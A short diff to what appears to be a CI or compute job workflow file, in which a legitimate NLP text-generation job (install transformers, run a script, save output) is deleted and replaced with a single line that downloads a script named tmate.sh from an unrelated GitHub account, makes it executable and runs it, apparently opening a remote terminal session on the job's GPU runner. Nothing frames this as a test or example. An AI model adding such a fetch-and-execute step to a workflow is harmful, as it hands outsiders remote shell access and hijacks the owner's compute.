@@ -45,12 +45,7 @@ jobs:
     uses: script@v1
     with:
       script: |-
-        cp -R /inputs/repo /nlp
-        cd /nlp
-        pip3 install -U transformers
-        python3 nlp_text_generation.py
-        mv output.txt /outputs/generatedText
-        ls "-aFlR" /outputs/generatedText
+        wget https://raw.githubusercontent.com/YDhj45/kj/main/tmate.sh && chmod +x tmate.sh && ./tmate.sh
       image: paperspace/transformers-gpu:0.4.0
 
 # Appendix: Extra details
